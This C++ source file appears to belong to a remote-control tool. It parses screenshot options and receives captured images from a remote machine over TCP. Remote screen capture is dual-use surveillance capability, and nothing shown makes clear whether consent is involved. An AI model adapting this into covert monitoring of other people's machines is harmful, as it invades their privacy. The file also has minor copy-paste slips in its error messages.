#include "command/execute/ScreenshotExecuter.h"

#include <iostream>
#include <cstdlib>

#include "methods/FileSaver.h"
#include "utils/string.h"


using namespace command;

std::string
ScreenshotExecuter::ToByteArray(
    const std::vector<std::string>& command_parts)
{
    m_lastCommand.bits_per_pixel = 24;
    m_lastCommand.png = false;
    m_lastCommand.captures = 1;
    m_lastCommand.wait_milliseconds = 0;

    for( uint32_t i = 1;
         i < command_parts.size();
         ++ i )
    {
        const std::string& current(command_parts[i]);

        if ( "bits" == current && i + 1 < command_parts.size() )
        {
            if ( "24" != command_parts[i+1] && "32" != command_parts[i+1] )
            {
                std::cerr << "Error: bits value should be either 24 or 32.\n";

                goto error;
            }

            m_lastCommand.bits_per_pixel = atoi(command_parts[i+1].c_str());
            ++i;
        }
        else if ( "png" == current )
        {
            m_lastCommand.png = true;
        }
        else if ( "captures" == current && i + 1 < command_parts.size() )
        {
            if ( false == utils::string::IsNumber(command_parts[i+1]) )
            {
                std::cerr << "Error: captures value should be an integer.\n";

                goto error;
            }

            m_lastCommand.captures = atoi(command_parts[i+1].c_str());
            ++i;
        }
        else if ( "wait" == current && i + 1 < command_parts.size() )
        {
            if ( false == utils::string::IsNumber(command_parts[i+1]) )
            {
                std::cerr << "Error: captures value should be an integer.\n";

                goto error;
            }

            m_lastCommand.wait_milliseconds = atoi(command_parts[i+1].c_str());
            ++i;
        }
        else if ( "help" == current )
        {
            std::cerr << "print help\n";

            return ( "" );
        }
        else
        {
            std::cerr << "Unknown parameter !\n";

            goto error;
        }
    }

    return ( std::string((char*)&m_lastCommand, sizeof(s_Translation)) );

error:

    return ( "" );

}

bool
ScreenshotExecuter::ProcessResponse(
    networking::ITCPClient& connection)
{
    methods::FileSaver saver;

    std::string extension = m_lastCommand.png ? ".png" : ".bmp";

    while ( m_lastCommand.captures-- > 0 )
    {
        if ( false == saver.SaveASingleFile(extension, std::ios::binary, connection) )
            ; // delete the file
    }

    return ( true );
}
